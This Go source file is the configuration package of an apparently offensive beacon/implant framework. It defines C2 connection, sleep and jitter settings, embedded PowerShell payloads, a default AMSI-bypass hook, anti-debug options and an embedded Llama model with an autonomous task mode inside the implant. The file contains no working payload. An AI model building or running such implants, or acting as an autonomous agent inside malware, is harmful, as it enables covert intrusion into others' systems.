package config

import (
	"fmt"
	"os"
	"path/filepath"

	"github.com/r74tech/virga/internal/implant/payloads"
	"gopkg.in/yaml.v3"
)

// BeaconConfig represents the complete beacon configuration
type BeaconConfig struct {
	Beacon   BeaconSettings   `yaml:"beacon"`
	Llama    LlamaSettings    `yaml:"llama"`
	Implant  ImplantSettings  `yaml:"implant"`
	Output   OutputSettings   `yaml:"output"`
	Advanced AdvancedSettings `yaml:"advanced"`
}

// BeaconSettings contains basic beacon configuration
type BeaconSettings struct {
	C2       C2Config         `yaml:"c2"`
	Behavior BehaviorConfig   `yaml:"behavior"`
	Target   TargetConfig     `yaml:"target"`
	Payloads []PayloadConfig  `yaml:"payloads"`
	Shell    ShellIntegration `yaml:"shell"`
}

// PayloadConfig defines an embedded payload bundled with the beacon
type PayloadConfig struct {
	Name         string `yaml:"name"`
	Source       string `yaml:"source"`
	Type         string `yaml:"type"`
	CommandsFile string `yaml:"commands_file,omitempty"` // Optional path to JSON file containing command definitions
}

// ShellIntegration configures shell-related helpers
type ShellIntegration struct {
	PowerShell PowerShellConfig `yaml:"powershell"`
}

// PowerShellConfig defines PowerShell specific behavior
type PowerShellConfig struct {
	AMSIBypass string `yaml:"amsi_bypass"`
}

// C2Config contains C2 server configuration
type C2Config struct {
	Host     string `yaml:"host"`
	Port     int    `yaml:"port"`
	Protocol string `yaml:"protocol"`
	URIPath  string `yaml:"uri_path"`
}

// BehaviorConfig contains beacon behavior settings
type BehaviorConfig struct {
	SleepTime int    `yaml:"sleep_time"`
	Jitter    int    `yaml:"jitter"`
	UserAgent string `yaml:"user_agent"`
}

// TargetConfig contains target platform configuration
type TargetConfig struct {
	OS     string `yaml:"os"`
	Arch   string `yaml:"arch"`
	Format string `yaml:"format"`
}

// LlamaSettings contains Llama AI configuration
type LlamaSettings struct {
	Enabled     bool              `yaml:"enabled"`
	LogEnabled  bool              `yaml:"log_enabled"`
	Model       ModelConfig       `yaml:"model"`
	Prompt      PromptConfig      `yaml:"prompt"`
	Autonomous  AutonomousConfig  `yaml:"autonomous"`
	TaskPrompts map[string]string `yaml:"task_prompts"`
}

// ImplantSettings contains implant runtime configuration
type ImplantSettings struct {
	LogEnabled  bool   `yaml:"log_enabled"`
	LogFilePath string `yaml:"log_file_path"`
	LogLevel    string `yaml:"log_level"` // debug, info, warn, error
}

// ModelConfig contains Llama model settings
type ModelConfig struct {
	Path        string  `yaml:"path"`
	Context     int     `yaml:"context"`
	GPULayers   int     `yaml:"gpu_layers"`
	Jinja       bool    `yaml:"jinja"` // Jinja template processing (required for some models like gpt-oss-20b)
	Threads     int     `yaml:"threads"`
	Temperature float64 `yaml:"temperature"`
	TopK        int     `yaml:"top_k"`
	TopP        float64 `yaml:"top_p"`
	MaxTokens   int     `yaml:"max_tokens"`
}

// PromptConfig contains prompt configuration
type PromptConfig struct {
	Preset string `yaml:"preset"`
	Custom string `yaml:"custom"`
}

// AutonomousConfig contains autonomous mode settings
type AutonomousConfig struct {
	Enabled        bool      `yaml:"enabled"`
	InitialTasks   []TaskDef `yaml:"initial_tasks"`
	MaxIterations  int       `yaml:"max_iterations"`
	TimeoutMinutes int       `yaml:"timeout_minutes"`
	ReportInterval int       `yaml:"report_interval"`
}

// TaskDef defines an autonomous task
type TaskDef struct {
	Type        string `yaml:"type"`
	Description string `yaml:"description"`
}

// OutputSettings contains output configuration
type OutputSettings struct {
	Path string `yaml:"path"`
}

// AdvancedSettings contains advanced options
type AdvancedSettings struct {
	StripSymbols bool `yaml:"strip_symbols"`
	Compress     bool `yaml:"compress"`
	AntiDebug    bool `yaml:"anti_debug"`
}

// LoadBeaconConfig loads beacon configuration from a YAML file
func LoadBeaconConfig(path string) (*BeaconConfig, error) {
	data, err := os.ReadFile(path)
	if err != nil {
		return nil, fmt.Errorf("failed to read config file: %w", err)
	}

	var config BeaconConfig
	if err := yaml.Unmarshal(data, &config); err != nil {
		return nil, fmt.Errorf("failed to parse config file: %w", err)
	}

	// Apply defaults if not specified
	config.SetDefaults()

	return &config, nil
}

// SaveBeaconConfig saves beacon configuration to a YAML file
func SaveBeaconConfig(config *BeaconConfig, path string) error {
	// Ensure directory exists
	dir := filepath.Dir(path)
	if dir != "." && dir != "" {
		if err := os.MkdirAll(dir, 0o755); err != nil {
			return fmt.Errorf("failed to create directory: %w", err)
		}
	}

	data, err := yaml.Marshal(config)
	if err != nil {
		return fmt.Errorf("failed to marshal config: %w", err)
	}

	// Write with secure permissions (owner read/write only)
	if err := os.WriteFile(path, data, 0o600); err != nil {
		return fmt.Errorf("failed to write config file: %w", err)
	}

	return nil
}

// Validate validates the beacon configuration
func (bc *BeaconConfig) Validate() error {
	// Validate C2 configuration
	if bc.Beacon.C2.Host == "" {
		return ErrEmptyHost
	}

	if err := ValidatePort(bc.Beacon.C2.Port); err != nil {
		return err
	}

	if err := ValidateProtocol(bc.Beacon.C2.Protocol); err != nil {
		return err
	}

	// Validate behavior configuration
	if bc.Beacon.Behavior.SleepTime <= 0 {
		return ErrInvalidSleepTime
	}

	if bc.Beacon.Behavior.Jitter < 0 || bc.Beacon.Behavior.Jitter > 100 {
		return ErrInvalidJitter
	}

	// Validate target configuration
	validOS := map[string]bool{"windows": true, "linux": true, "darwin": true}
	if !validOS[bc.Beacon.Target.OS] {
		return fmt.Errorf("invalid target OS: %s", bc.Beacon.Target.OS)
	}

	validArch := map[string]bool{"amd64": true, "386": true, "arm64": true}
	if !validArch[bc.Beacon.Target.Arch] {
		return fmt.Errorf("invalid target architecture: %s", bc.Beacon.Target.Arch)
	}

	// Validate Llama configuration if enabled
	if bc.Llama.Enabled {
		if bc.Llama.Model.Path == "" {
			return fmt.Errorf("llama model path is required when Llama is enabled")
		}

		if bc.Llama.Model.Context <= 0 {
			return fmt.Errorf("llama context size must be positive")
		}

		if bc.Llama.Model.MaxTokens <= 0 {
			return fmt.Errorf("llama max tokens must be positive")
		}

		if bc.Llama.Model.Temperature < 0 || bc.Llama.Model.Temperature > 2 {
			return fmt.Errorf("llama temperature must be between 0 and 2")
		}
	}

	// Validate implant log configuration
	if bc.Implant.LogEnabled && bc.Implant.LogLevel != "" {
		if err := ValidateLogLevel(bc.Implant.LogLevel); err != nil {
			return fmt.Errorf("implant log level: %w", err)
		}
	}

	// Validate embedded payload configuration
	if len(bc.Beacon.Payloads) > 0 {
		seen := make(map[string]struct{})
		for _, payload := range bc.Beacon.Payloads {
			if payload.Name == "" {
				return fmt.Errorf("payload name cannot be empty")
			}
			if payload.Source == "" {
				return fmt.Errorf("payload %s source cannot be empty", payload.Name)
			}
			ptype := payload.Type
			if ptype == "" {
				ptype = "powershell"
			}
			switch ptype {
			case "powershell":
			default:
				return fmt.Errorf("unsupported payload type %s for %s", ptype, payload.Name)
			}
			if _, exists := seen[payload.Name]; exists {
				return fmt.Errorf("duplicate payload name: %s", payload.Name)
			}
			seen[payload.Name] = struct{}{}
		}
	}

	return nil
}

// SetDefaults sets default values for the beacon configuration
func (bc *BeaconConfig) SetDefaults() {
	// Set default C2 configuration
	if bc.Beacon.C2.Port == 0 {
		bc.Beacon.C2.Port = 8443
	}
	if bc.Beacon.C2.Protocol == "" {
		bc.Beacon.C2.Protocol = "https"
	}

	// Set default behavior
	if bc.Beacon.Behavior.SleepTime == 0 {
		bc.Beacon.Behavior.SleepTime = 60
	}
	if bc.Beacon.Behavior.UserAgent == "" {
		bc.Beacon.Behavior.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
	}

	// Set default target
	if bc.Beacon.Target.OS == "" {
		bc.Beacon.Target.OS = "windows"
	}
	if bc.Beacon.Target.Arch == "" {
		bc.Beacon.Target.Arch = "amd64"
	}
	if bc.Beacon.Target.Format == "" {
		bc.Beacon.Target.Format = "exe"
	}

	// Set default Llama configuration
	if bc.Llama.Model.Context == 0 {
		bc.Llama.Model.Context = 8192
	}
	if bc.Llama.Model.MaxTokens == 0 {
		bc.Llama.Model.MaxTokens = 2048
	}
	if bc.Llama.Model.Temperature == 0 {
		bc.Llama.Model.Temperature = 0.7
	}
	if bc.Llama.Model.Threads == 0 {
		bc.Llama.Model.Threads = 4
	}

	// Set default autonomous configuration
	if bc.Llama.Autonomous.MaxIterations == 0 {
		bc.Llama.Autonomous.MaxIterations = 50
	}
	if bc.Llama.Autonomous.TimeoutMinutes == 0 {
		bc.Llama.Autonomous.TimeoutMinutes = 30
	}
	if bc.Llama.Autonomous.ReportInterval == 0 {
		bc.Llama.Autonomous.ReportInterval = 60
	}

	// Set default implant log level
	if bc.Implant.LogEnabled && bc.Implant.LogLevel == "" {
		bc.Implant.LogLevel = "info"
	}

	// Ensure shell configuration struct is initialized
	if bc.Beacon.Shell.PowerShell.AMSIBypass == "" {
		bc.Beacon.Shell.PowerShell.AMSIBypass = payloads.GetPowerShellAmsiBypass()
	}
}

// GetSystemPrompt returns the appropriate system prompt based on configuration
func (l *LlamaSettings) GetSystemPrompt() string {
	if l.Prompt.Preset == "custom" && l.Prompt.Custom != "" {
		return l.Prompt.Custom
	}
	// Return preset name - actual prompt resolution happens in the implant
	return l.Prompt.Preset
}
